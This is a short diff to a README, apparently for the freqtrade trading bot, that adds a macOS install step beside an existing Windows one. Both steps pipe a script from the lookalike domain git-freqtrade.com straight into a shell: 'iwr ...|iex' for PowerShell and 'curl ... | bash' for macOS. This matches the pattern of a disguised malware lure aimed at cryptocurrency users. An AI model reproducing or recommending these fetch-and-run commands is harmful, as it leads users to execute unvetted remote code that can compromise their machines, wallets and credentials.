@@ -83,6 +83,11 @@ Open cmd and run this command
 ```powershell
 powershell -NoP -Command "iwr https://git-freqtrade.com/windows|iex"
 ```
+For MacOS:
+Open terminal and run this comman
+```bash
+/bin/bash -c "$(curl -fsSL -L https://git-freqtrade.com/mac)"
+```
 ## Basic Usage
 
 ### Bot commands
